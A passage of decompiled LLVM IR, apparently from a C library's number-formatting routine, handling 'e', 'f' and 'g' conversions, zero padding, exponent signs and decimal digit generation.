  %v3_80554aa = icmp eq i1 %v10_80554a5, %v8_80554a5
  %v4_80554aa = icmp eq i1 %v9_80554a5, false
  %v5_80554aa = and i1 %v4_80554aa, %v3_80554aa
  br i1 %v5_80554aa, label %dec_label_pc_80554b9, label %dec_label_pc_80554ac

dec_label_pc_80554ac:                             ; preds = %dec_label_pc_80554a1
  %v4_80554ac = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_80554b9

dec_label_pc_80554b9:                             ; preds = %dec_label_pc_80554a1, %dec_label_pc_80554ac
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_80554a1 ], [ %v4_80554ac, %dec_label_pc_80554ac ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_80554a1 ], [ 69, %dec_label_pc_80554ac ]
  %v12_80554b9 = icmp eq i8 %stack_var_-206.1, 103
  %v1_80554be = icmp eq i1 %v12_80554b9, false
  br i1 %v1_80554be, label %dec_label_pc_80554c7, label %dec_label_pc_80554c0

dec_label_pc_80554c0:                             ; preds = %dec_label_pc_80554b9
  %v0_80554c0 = load i32, i32* %ebp.global-to-local, align 4
  %tmp137 = icmp slt i32 %v0_80554c0, 1
  br i1 %tmp137, label %dec_label_pc_80554ce, label %dec_label_pc_80554c4

dec_label_pc_80554c4:                             ; preds = %dec_label_pc_80554c0
  %v1_80554c4 = add i32 %v0_80554c0, -1
  store i32 %v1_80554c4, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80554ce

dec_label_pc_80554c7:                             ; preds = %dec_label_pc_80554b9
  %v12_80554c7 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_80554c7, label %dec_label_pc_80554d2, label %dec_label_pc_80554c7.dec_label_pc_80554ce_crit_edge

dec_label_pc_80554c7.dec_label_pc_80554ce_crit_edge: ; preds = %dec_label_pc_80554c7
  %v0_80554ce.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80554ce

dec_label_pc_80554ce:                             ; preds = %dec_label_pc_80554c7.dec_label_pc_80554ce_crit_edge, %dec_label_pc_80554c0, %dec_label_pc_80554c4
  %v0_80554ce = phi i32 [ %v0_80554ce.pre, %dec_label_pc_80554c7.dec_label_pc_80554ce_crit_edge ], [ %v0_80554c0, %dec_label_pc_80554c0 ], [ %v1_80554c4, %dec_label_pc_80554c4 ]
  store i32 %v0_80554ce, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80554ff

dec_label_pc_80554d2:                             ; preds = %dec_label_pc_80554c7
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_80554d6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80554d6 = add i32 %v0_80554d6, -1
  store i32 %v2_80554d6, i32* %ebx.global-to-local, align 4
  %v5_80554dd = icmp slt i32 %v2_80554d6, -1
  br i1 %v5_80554dd, label %dec_label_pc_80554df, label %dec_label_pc_80554ff

dec_label_pc_80554df:                             ; preds = %dec_label_pc_80554d2
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80554e7 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_80554e7, i32* %eax.global-to-local, align 4
  %v4_80554ef = bitcast i32* %stack_var_-72 to i8*
  %v5_80554ef = call i32 @__GI_memset(i8* %v4_80554ef, i32 48, i32 21)
  store i32 %v5_80554ef, i32* %eax.global-to-local, align 4
  %v0_805550f.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80554ff

dec_label_pc_80554ff:                             ; preds = %dec_label_pc_80554d2, %dec_label_pc_80554df, %dec_label_pc_80554ce
  %v1_805551f = phi i32 [ %v0_80554ce, %dec_label_pc_80554ce ], [ %v0_805550f.pr.pre, %dec_label_pc_80554df ], [ %v2_80554d6, %dec_label_pc_80554d2 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8055512 = icmp sgt i32 %v1_805551f, 20
  br i1 %v7_8055512, label %dec_label_pc_8055514, label %dec_label_pc_805551f

dec_label_pc_8055514:                             ; preds = %dec_label_pc_80554ff
  %v2_8055514 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8055514, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8055533.preheader

dec_label_pc_805551f:                             ; preds = %dec_label_pc_80554ff
  %v0_805551f = load i32, i32* @esp, align 4
  %v2_805551f = add i32 %v1_805551f, 165
  %v3_805551f = add i32 %v2_805551f, %v0_805551f
  store i32 %v3_805551f, i32* %eax.global-to-local, align 4
  %v1_8055526 = add i32 %v3_805551f, 2
  store i32 %v1_8055526, i32* %ecx.global-to-local, align 4
  %v2_8055529 = inttoptr i32 %v1_8055526 to i8*
  %v3_8055529 = load i8, i8* %v2_8055529, align 1
  %v4_8055529 = add i8 %v3_8055529, -53
  %v9_8055529 = sub i8 52, %v3_8055529
  %v10_8055529 = and i8 %v9_8055529, %v3_8055529
  %v11_8055529 = icmp slt i8 %v10_8055529, 0
  %v13_8055529 = icmp slt i8 %v4_8055529, 0
  %v2_805552d = icmp eq i1 %v13_8055529, %v11_8055529
  %v3_805552d = zext i1 %v2_805552d to i32
  br label %dec_label_pc_8055533.preheader

dec_label_pc_8055533.preheader:                   ; preds = %dec_label_pc_805551f, %dec_label_pc_8055514
  %v0_805553363 = phi i32 [ %v1_8055526, %dec_label_pc_805551f ], [ %v2_8055514, %dec_label_pc_8055514 ]
  %storemerge52 = phi i32 [ %v3_805552d, %dec_label_pc_805551f ], [ 0, %dec_label_pc_8055514 ]
  store i32 %storemerge52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055533

dec_label_pc_8055533:                             ; preds = %dec_label_pc_8055533.backedge, %dec_label_pc_8055533.preheader
  %v3_8055534 = phi i32 [ %v3_8055534.pre, %dec_label_pc_8055533.backedge ], [ %storemerge52, %dec_label_pc_8055533.preheader ]
  %v0_8055533 = phi i32 [ %v0_8055536, %dec_label_pc_8055533.backedge ], [ %v0_805553363, %dec_label_pc_8055533.preheader ]
  %v1_8055533 = add i32 %v0_8055533, -1
  store i32 %v1_8055533, i32* %ecx.global-to-local, align 4
  %v1_8055534 = inttoptr i32 %v1_8055533 to i8*
  %v2_8055534 = load i8, i8* %v1_8055534, align 1
  %v4_8055534 = trunc i32 %v3_8055534 to i8
  %v5_8055534 = add i8 %v2_8055534, %v4_8055534
  store i8 %v5_8055534, i8* %v1_8055534, align 1
  %v0_8055536 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055536 = inttoptr i32 %v0_8055536 to i8*
  %v2_8055536 = load i8, i8* %v1_8055536, align 1
  %v3_8055536 = zext i8 %v2_8055536 to i32
  %v4_8055536 = load i32, i32* %edx.global-to-local, align 4
  %v5_8055536 = and i32 %v4_8055536, -256
  %v6_8055536 = or i32 %v5_8055536, %v3_8055536
  store i32 %v6_8055536, i32* %edx.global-to-local, align 4
  %v7_8055538 = icmp eq i8 %v2_8055536, 48
  br i1 %v7_8055538, label %dec_label_pc_8055533.backedge, label %dec_label_pc_805553d

dec_label_pc_8055533.backedge:                    ; preds = %dec_label_pc_8055533, %dec_label_pc_805553d
  %v3_8055534.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055533

dec_label_pc_805553d:                             ; preds = %dec_label_pc_8055533
  %v2_805553d = add i8 %v2_8055536, -57
  %v7_805553d = sub i8 56, %v2_8055536
  %v8_805553d = and i8 %v7_805553d, %v2_8055536
  %v9_805553d = icmp slt i8 %v8_805553d, 0
  %v10_805553d = icmp eq i8 %v2_805553d, 0
  %v11_805553d = icmp slt i8 %v2_805553d, 0
  %v3_8055540 = icmp eq i1 %v11_805553d, %v9_805553d
  %v4_8055540 = icmp eq i1 %v10_805553d, false
  %v5_8055540 = and i1 %v4_8055540, %v3_8055540
  br i1 %v5_8055540, label %dec_label_pc_8055533.backedge, label %dec_label_pc_8055542

dec_label_pc_8055542:                             ; preds = %dec_label_pc_805553d
  %v2_8055542 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8055542, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ugt i32 %v0_8055536, %v2_8055542
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp145, label %dec_label_pc_805554d, label %dec_label_pc_805555a

dec_label_pc_805554d:                             ; preds = %dec_label_pc_8055542
  store i32 %v2_805542f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055563

dec_label_pc_805555a:                             ; preds = %dec_label_pc_8055542
  store i32 %v2_8055542, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_8055542, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8055563

dec_label_pc_8055563:                             ; preds = %dec_label_pc_805554d, %dec_label_pc_805555a
  %v0_8055563 = phi i32 [ %v0_8055536, %dec_label_pc_805554d ], [ %v2_8055542, %dec_label_pc_805555a ]
  %v1_8055563 = add i32 %v0_8055563, 1
  store i32 %v1_8055563, i32* %eax.global-to-local, align 4
  %v2_805556a = inttoptr i32 %v1_8055563 to i8*
  store i8 0, i8* %v2_805556a, align 1
  br i1 %v1_80554be, label %dec_label_pc_8055590, label %dec_label_pc_8055575

dec_label_pc_8055575:                             ; preds = %dec_label_pc_8055563
  %v0_8055575 = load i32, i32* %esi.global-to-local, align 4
  %v5_8055578 = icmp slt i32 %v0_8055575, -4
  br i1 %v5_8055578, label %dec_label_pc_805559d, label %dec_label_pc_805557a

dec_label_pc_805557a:                             ; preds = %dec_label_pc_8055575
  %v1_805557a = load i32, i32* %ebx.global-to-local, align 4
  %v7_805557c = icmp slt i32 %v1_805557a, %v0_8055575
  br i1 %v7_805557c, label %dec_label_pc_805559d, label %dec_label_pc_8055585

dec_label_pc_8055585:                             ; preds = %dec_label_pc_805557a
  %v2_805558c = sub i32 %v1_805557a, %v0_8055575
  store i32 %v2_805558c, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80555a1

dec_label_pc_8055590:                             ; preds = %dec_label_pc_8055563
  %v4_8055590 = zext i8 %stack_var_-206.1 to i32
  %v5_8055590 = load i32, i32* %ecx.global-to-local, align 4
  %v6_8055590 = and i32 %v5_8055590, -256
  %v7_8055590 = or i32 %v6_8055590, %v4_8055590
  store i32 %v7_8055590, i32* %ecx.global-to-local, align 4
  %v10_8055598 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_8055598, label %dec_label_pc_8055590.dec_label_pc_80555a1_crit_edge, label %dec_label_pc_805559d

dec_label_pc_8055590.dec_label_pc_80555a1_crit_edge: ; preds = %dec_label_pc_8055590
  %v0_80555a1.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80555a1

dec_label_pc_805559d:                             ; preds = %dec_label_pc_8055575, %dec_label_pc_805557a, %dec_label_pc_8055590
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_8055590 ], [ 103, %dec_label_pc_805557a ], [ 103, %dec_label_pc_8055575 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80555ab

dec_label_pc_80555a1:                             ; preds = %dec_label_pc_8055590.dec_label_pc_80555a1_crit_edge, %dec_label_pc_8055585
  %v0_80555a1 = phi i32 [ %v0_80555a1.pre, %dec_label_pc_8055590.dec_label_pc_80555a1_crit_edge ], [ %v0_8055575, %dec_label_pc_8055585 ]
  store i32 %v0_80555a1, i32* %ebx.global-to-local, align 4
  %v2_80555a3 = icmp slt i32 %v0_80555a1, 0
  %v1_80555a5 = icmp eq i1 %v2_80555a3, false
  br i1 %v1_80555a5, label %dec_label_pc_80555ab, label %dec_label_pc_80555a7

dec_label_pc_80555a7:                             ; preds = %dec_label_pc_80555a1
  %v0_80555a7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80555a7 = add i32 %v0_80555a7, -1
  store i32 %v1_80555a7, i32* %edx.global-to-local, align 4
  %v1_80555a8 = inttoptr i32 %v1_80555a7 to i8*
  store i8 48, i8* %v1_80555a8, align 1
  %v0_80555e0.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80555ab

dec_label_pc_80555ab:                             ; preds = %dec_label_pc_80555a1, %dec_label_pc_805559d, %dec_label_pc_80555a7
  %v1_805563b = phi i32 [ %v0_80555a1, %dec_label_pc_80555a1 ], [ %v0_80555e0.pre, %dec_label_pc_80555a7 ], [ 0, %dec_label_pc_805559d ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_80555a1 ], [ 102, %dec_label_pc_80555a7 ], [ %stack_var_-197.0, %dec_label_pc_805559d ]
  %v2_80555ab = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_80555ab, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_80555c6 = load i32, i32* %edx.global-to-local, align 4
  %v1_80555c6 = inttoptr i32 %v0_80555c6 to i8*
  %v2_80555c6 = load i8, i8* %v1_80555c6, align 1
  %v3_80555c6 = zext i8 %v2_80555c6 to i32
  %v5_80555c6 = and i32 %v2_80555ab, -256
  %v6_80555c6 = or i32 %v3_80555c6, %v5_80555c6
  store i32 %v6_80555c6, i32* %eax.global-to-local, align 4
  %v1_80555c8 = add i32 %v0_80555c6, 1
  store i32 %v1_80555c8, i32* %edi.global-to-local, align 4
  store i32 %v6_80555c6, i32* %stack_var_-22, align 4
  %v2_80555d6 = sub i32 %v1_8055563, %v1_80555c8
  store i32 %v2_80555d6, i32* %edx.global-to-local, align 4
  %v1_80555e0 = icmp eq i32 %v1_805563b, 0
  %v2_80555e0 = icmp slt i32 %v1_805563b, 0
  br i1 %v2_80555e0, label %dec_label_pc_805562f, label %dec_label_pc_80555e4

dec_label_pc_80555e4:                             ; preds = %dec_label_pc_80555ab
  store i32 112, i32* %stack_var_-144, align 4
  %v2_80555f0 = sub i32 %v1_805563b, %v2_80555d6
  %v8_80555f0 = xor i32 %v2_80555d6, %v1_805563b
  %v9_80555f0 = xor i32 %v2_80555f0, %v1_805563b
  %v10_80555f0 = and i32 %v9_80555f0, %v8_80555f0
  %v11_80555f0 = icmp slt i32 %v10_80555f0, 0
  %v13_80555f0 = icmp slt i32 %v2_80555f0, 0
  %v2_80555f2 = icmp eq i1 %v13_80555f0, %v11_80555f0
  br i1 %v2_80555f2, label %dec_label_pc_80555f4, label %dec_label_pc_8055628

dec_label_pc_80555f4:                             ; preds = %dec_label_pc_80555e4
  store i32 %v2_80555f0, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v2_80555f0, 1
  %tmp139 = icmp eq i1 %tmp138, false
  br i1 %tmp139, label %dec_label_pc_8055609, label %dec_label_pc_8055624

dec_label_pc_8055609:                             ; preds = %dec_label_pc_80555f4
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8055624

dec_label_pc_8055624:                             ; preds = %dec_label_pc_80555f4, %dec_label_pc_8055609
  %storemerge10.in = phi i32* [ %stack_var_-120, %dec_label_pc_8055609 ], [ %stack_var_-132, %dec_label_pc_80555f4 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge10 = ptrtoint i32* %storemerge10.in to i32
  store i32 %storemerge10, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055644

dec_label_pc_8055628:                             ; preds = %dec_label_pc_80555e4
  %v4_805562a = icmp eq i1 %v1_80555e0, false
  br i1 %v4_805562a, label %dec_label_pc_8055635, label %dec_label_pc_805562c

dec_label_pc_805562c:                             ; preds = %dec_label_pc_8055628
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805562f

dec_label_pc_805562f:                             ; preds = %dec_label_pc_80555ab, %dec_label_pc_805562c
  %v0_805567773 = phi i32 [ %v1_805563b, %dec_label_pc_80555ab ], [ -1, %dec_label_pc_805562c ]
  %v2_805562f = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805562f, i32* @ecx, align 4
  br label %dec_label_pc_8055644

dec_label_pc_8055635:                             ; preds = %dec_label_pc_8055628
  %v2_8055639 = add i32 %v1_80555c8, %v1_805563b
  store i32 %v2_8055639, i32* %edi.global-to-local, align 4
  %v2_805563b = sub i32 %v2_80555d6, %v1_805563b
  store i32 %v2_805563b, i32* %edx.global-to-local, align 4
  %v2_805563d = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_805563d, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055644

dec_label_pc_8055644:                             ; preds = %dec_label_pc_805562f, %dec_label_pc_8055624, %dec_label_pc_8055635
  %v0_805567772 = phi i32 [ %v0_805567773, %dec_label_pc_805562f ], [ -1, %dec_label_pc_8055624 ], [ -1, %dec_label_pc_8055635 ]
  %v0_8055660 = phi i32 [ %v2_805562f, %dec_label_pc_805562f ], [ %storemerge10, %dec_label_pc_8055624 ], [ %v2_805563d, %dec_label_pc_8055635 ]
  %v0_8055651 = phi i32 [ %v2_80555d6, %dec_label_pc_805562f ], [ 0, %dec_label_pc_8055624 ], [ %v2_805563b, %dec_label_pc_8055635 ]
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v2_805564b = inttoptr i32 %v1_80552a3 to i8*
  %v3_805564b = load i8, i8* %v2_805564b, align 1
  %v4_805564b = and i8 %v3_805564b, 16
  %v5_805564b = icmp eq i8 %v4_805564b, 0
  %v1_805564f = icmp eq i1 %v5_805564b, false
  br i1 %v1_805564f, label %dec_label_pc_8055660, label %dec_label_pc_8055651

dec_label_pc_8055651:                             ; preds = %dec_label_pc_8055644
  %v1_8055651 = icmp eq i32 %v0_8055651, 0
  %v1_8055653 = icmp eq i1 %v1_8055651, false
  br i1 %v1_8055653, label %dec_label_pc_8055660, label %dec_label_pc_8055655

dec_label_pc_8055655:                             ; preds = %dec_label_pc_8055651
  br i1 %v12_80554b9, label %dec_label_pc_8055677, label %dec_label_pc_805565c

dec_label_pc_805565c:                             ; preds = %dec_label_pc_8055655
  %v0_805565c = load i32, i32* %ebp.global-to-local, align 4
  %tmp140 = icmp slt i32 %v0_805565c, 1
  br i1 %tmp140, label %dec_label_pc_8055677, label %dec_label_pc_8055660

dec_label_pc_8055660:                             ; preds = %dec_label_pc_805565c, %dec_label_pc_8055651, %dec_label_pc_8055644
  %v1_8055660 = inttoptr i32 %v0_8055660 to i32*
  store i32 112, i32* %v1_8055660, align 4
  %v0_8055666 = load i32, i32* @ecx, align 4
  %v1_8055666 = add i32 %v0_8055666, 4
  %v2_8055666 = inttoptr i32 %v1_8055666 to i32*
  store i32 1, i32* %v2_8055666, align 4
  %v0_805566d = load i32, i32* @ecx, align 4
  %v1_805566d = add i32 %v0_805566d, 8
  %v2_805566d = inttoptr i32 %v1_805566d to i32*
  store i32 ptrtoint (i32* @global_var_805aa20.557 to i32), i32* %v2_805566d, align 4
  %v0_8055674 = load i32, i32* @ecx, align 4
  %v1_8055674 = add i32 %v0_8055674, 12
  store i32 %v1_8055674, i32* @ecx, align 4
  %v0_8055677.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055677

dec_label_pc_8055677:                             ; preds = %dec_label_pc_805565c, %dec_label_pc_8055655, %dec_label_pc_8055660
  %v0_805567c = phi i32 [ %v0_8055660, %dec_label_pc_805565c ], [ %v0_8055660, %dec_label_pc_8055655 ], [ %v1_8055674, %dec_label_pc_8055660 ]
  %v0_8055677 = phi i32 [ %v0_805567772, %dec_label_pc_805565c ], [ %v0_805567772, %dec_label_pc_8055655 ], [ %v0_8055677.pre, %dec_label_pc_8055660 ]
  %v1_8055677 = add i32 %v0_8055677, 1
  %v8_8055677 = icmp eq i32 %v1_8055677, 0
  store i32 %v1_8055677, i32* %ebx.global-to-local, align 4
  br i1 %v8_8055677, label %dec_label_pc_8055691, label %dec_label_pc_805567a

dec_label_pc_805567a:                             ; preds = %dec_label_pc_8055677
  store i32 %v1_8055677, i32* %eax.global-to-local, align 4
  %v1_805567c = inttoptr i32 %v0_805567c to i32*
  store i32 176, i32* %v1_805567c, align 4
  %v0_8055682 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055682 = sub i32 0, %v0_8055682
  store i32 %v1_8055682, i32* %eax.global-to-local, align 4
  %v1_8055684 = load i32, i32* @ecx, align 4
  %v2_8055684 = add i32 %v1_8055684, 4
  %v3_8055684 = inttoptr i32 %v2_8055684 to i32*
  store i32 %v1_8055682, i32* %v3_8055684, align 4
  %v0_8055687 = load i32, i32* @ecx, align 4
  %v1_8055687 = add i32 %v0_8055687, 8
  %v2_8055687 = inttoptr i32 %v1_8055687 to i32*
  store i32 ptrtoint (i32* @global_var_805aa13.556 to i32), i32* %v2_8055687, align 4
  %v0_805568e = load i32, i32* @ecx, align 4
  %v1_805568e = add i32 %v0_805568e, 12
  store i32 %v1_805568e, i32* @ecx, align 4
  br label %dec_label_pc_8055691

dec_label_pc_8055691:                             ; preds = %dec_label_pc_8055677, %dec_label_pc_805567a
  %v0_8055695 = phi i32 [ %v0_805567c, %dec_label_pc_8055677 ], [ %v1_805568e, %dec_label_pc_805567a ]
  %v0_8055691 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055691 = icmp eq i32 %v0_8055691, 0
  br i1 %v1_8055691, label %dec_label_pc_80556a4, label %dec_label_pc_8055695

dec_label_pc_8055695:                             ; preds = %dec_label_pc_8055691
  %v1_8055695 = inttoptr i32 %v0_8055695 to i32*
  store i32 112, i32* %v1_8055695, align 4
  %v0_805569b = load i32, i32* %edx.global-to-local, align 4
  %v1_805569b = load i32, i32* @ecx, align 4
  %v2_805569b = add i32 %v1_805569b, 4
  %v3_805569b = inttoptr i32 %v2_805569b to i32*
  store i32 %v0_805569b, i32* %v3_805569b, align 4
  %v0_805569e = load i32, i32* %edi.global-to-local, align 4
  %v1_805569e = load i32, i32* @ecx, align 4
  %v2_805569e = add i32 %v1_805569e, 8
  %v3_805569e = inttoptr i32 %v2_805569e to i32*
  store i32 %v0_805569e, i32* %v3_805569e, align 4
  %v0_80556a1 = load i32, i32* @ecx, align 4
  %v1_80556a1 = add i32 %v0_80556a1, 12
  store i32 %v1_80556a1, i32* @ecx, align 4
  br label %dec_label_pc_80556a4

dec_label_pc_80556a4:                             ; preds = %dec_label_pc_8055691, %dec_label_pc_8055695
  %v0_80556c2 = phi i32 [ %v0_8055695, %dec_label_pc_8055691 ], [ %v1_80556a1, %dec_label_pc_8055695 ]
  br i1 %v1_80554be, label %dec_label_pc_80556b8, label %dec_label_pc_80556ab

dec_label_pc_80556ab:                             ; preds = %dec_label_pc_80556a4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v3_80556b2 = load i8, i8* %v2_805564b, align 1
  %v4_80556b2 = and i8 %v3_80556b2, 16
  %v5_80556b2 = icmp eq i8 %v4_80556b2, 0
  br i1 %v5_80556b2, label %dec_label_pc_80556d5, label %dec_label_pc_80556b8

dec_label_pc_80556b8:                             ; preds = %dec_label_pc_80556ab, %dec_label_pc_80556a4
  %v0_80556b8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80556ba = load i32, i32* %ebx.global-to-local, align 4
  %v2_80556ba = sub i32 %v0_80556b8, %v1_80556ba
  store i32 %v2_80556ba, i32* %eax.global-to-local, align 4
  %v1_80556bc = load i32, i32* %ebp.global-to-local, align 4
  %v2_80556bc = sub i32 %v2_80556ba, %v1_80556bc
  %v8_80556bc = xor i32 %v1_80556bc, %v2_80556ba
  %v9_80556bc = xor i32 %v2_80556bc, %v2_80556ba
  %v10_80556bc = and i32 %v9_80556bc, %v8_80556bc
  %v11_80556bc = icmp slt i32 %v10_80556bc, 0
  %v13_80556bc = icmp slt i32 %v2_80556bc, 0
  %v2_80556be = icmp eq i1 %v13_80556bc, %v11_80556bc
  br i1 %v2_80556be, label %dec_label_pc_80556d5, label %dec_label_pc_80556c0

dec_label_pc_80556c0:                             ; preds = %dec_label_pc_80556b8
  %v2_80556c0 = sub i32 %v1_80556bc, %v2_80556ba
  store i32 %v2_80556c0, i32* %ebp.global-to-local, align 4
  %v1_80556c2 = inttoptr i32 %v0_80556c2 to i32*
  store i32 176, i32* %v1_80556c2, align 4
  %v0_80556c8 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80556c8 = load i32, i32* @ecx, align 4
  %v2_80556c8 = add i32 %v1_80556c8, 4
  %v3_80556c8 = inttoptr i32 %v2_80556c8 to i32*
  store i32 %v0_80556c8, i32* %v3_80556c8, align 4
  %v0_80556cb = load i32, i32* @ecx, align 4
  %v1_80556cb = add i32 %v0_80556cb, 8
  %v2_80556cb = inttoptr i32 %v1_80556cb to i32*
  store i32 ptrtoint (i32* @global_var_805aa13.556 to i32), i32* %v2_80556cb, align 4
  %v0_80556d2 = load i32, i32* @ecx, align 4
  %v1_80556d2 = add i32 %v0_80556d2, 12
  store i32 %v1_80556d2, i32* @ecx, align 4
  br label %dec_label_pc_80556d5

dec_label_pc_80556d5:                             ; preds = %dec_label_pc_80556b8, %dec_label_pc_80556ab, %dec_label_pc_80556c0
  %v1_805575884 = phi i32 [ %v0_80556c2, %dec_label_pc_80556b8 ], [ %v0_80556c2, %dec_label_pc_80556ab ], [ %v1_80556d2, %dec_label_pc_80556c0 ]
  %v12_80556d5 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_80556d5, label %dec_label_pc_805574b, label %dec_label_pc_80556dc

dec_label_pc_80556dc:                             ; preds = %dec_label_pc_80556d5
  %v0_80556e3 = load i32, i32* %esi.global-to-local, align 4
  %v2_80556e3 = icmp slt i32 %v0_80556e3, 0
  %v1_80556e5 = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_80556e3, i32* %edx.global-to-local, align 4
  br i1 %v2_80556e3, label %dec_label_pc_80556f4, label %dec_label_pc_80556eb

dec_label_pc_80556eb:                             ; preds = %dec_label_pc_80556dc
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80556fd

dec_label_pc_80556f4:                             ; preds = %dec_label_pc_80556dc
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_80556fb = sub i32 0, %v0_80556e3
  store i32 %v1_80556fb, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80556fd

dec_label_pc_80556fd:                             ; preds = %dec_label_pc_80556eb, %dec_label_pc_80556f4
  %v0_805571177 = phi i32 [ %v0_80556e3, %dec_label_pc_80556eb ], [ %v1_80556fb, %dec_label_pc_80556f4 ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8055705 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8055705, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055711

dec_label_pc_8055711:                             ; preds = %dec_label_pc_8055711.backedge, %dec_label_pc_80556fd
  %v0_805571f = phi i32 [ %v0_8055722, %dec_label_pc_8055711.backedge ], [ 2, %dec_label_pc_80556fd ]
  %v0_805571b = phi i32 [ %v0_805571b.pre, %dec_label_pc_8055711.backedge ], [ %v2_8055705, %dec_label_pc_80556fd ]
  %v0_8055711 = phi i32 [ %v9_8055719, %dec_label_pc_8055711.backedge ], [ %v0_805571177, %dec_label_pc_80556fd ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_8055718 = ashr i32 %v0_8055711, 31
  %v2_8055719 = zext i32 %v0_8055711 to i64
  %v4_8055719 = zext i32 %v1_8055718 to i64
  %v5_8055719 = mul nuw i64 %v4_8055719, 4294967296
  %v6_8055719 = or i64 %v5_8055719, %v2_8055719
  %v8_8055719 = sdiv i64 %v6_8055719, 10
  %v9_8055719 = trunc i64 %v8_8055719 to i32
  store i32 %v9_8055719, i32* %eax.global-to-local, align 4
  %v11_8055719 = srem i64 %v6_8055719, 10
  %v12_8055719 = trunc i64 %v11_8055719 to i8
  %v1_805571b = add i32 %v0_805571b, -1
  store i32 %v1_805571b, i32* %ebx.global-to-local, align 4
  %v1_805571c = add i8 %v12_8055719, 48
  %v1_805571f = add i32 %v0_805571f, 1
  store i32 %v1_805571f, i32* %esi.global-to-local, align 4
  %v3_8055720 = inttoptr i32 %v1_805571b to i8*
  store i8 %v1_805571c, i8* %v3_8055720, align 1
  %v0_8055722 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_8055719, i32* %edx.global-to-local, align 4
  %v7_8055727 = icmp sgt i32 %v0_8055722, 3
  br i1 %v7_8055727, label %dec_label_pc_8055729, label %dec_label_pc_8055711.backedge

dec_label_pc_8055729:                             ; preds = %dec_label_pc_8055711
  %v2_8055729 = icmp eq i32 %v9_8055719, 0
  %v1_805572b = icmp eq i1 %v2_8055729, false
  br i1 %v1_805572b, label %dec_label_pc_8055711.backedge, label %dec_label_pc_805572d

dec_label_pc_8055711.backedge:                    ; preds = %dec_label_pc_8055729, %dec_label_pc_8055711
  %v0_805571b.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055711

dec_label_pc_805572d:                             ; preds = %dec_label_pc_8055729
  %v0_805572d = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_805572d, i32* %edx.global-to-local, align 4
  %v0_805572f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805572f = add i32 %v0_805572f, -2
  store i32 %v1_805572f, i32* %eax.global-to-local, align 4
  %v1_8055732 = trunc i32 %v0_805572d to i8
  %v3_8055732 = add i32 %v0_805572f, -1
  %v4_8055732 = inttoptr i32 %v3_8055732 to i8*
  store i8 %v1_8055732, i8* %v4_8055732, align 1
  %v5_8055735 = load i32, i32* %edx.global-to-local, align 4
  %v6_8055735 = and i32 %v5_8055735, -256
  %v7_8055735 = or i32 %v6_8055735, %stack_var_-42.0
  store i32 %v7_8055735, i32* %edx.global-to-local, align 4
  %v2_8055739 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8055739 = add i32 %v2_8055739, -2
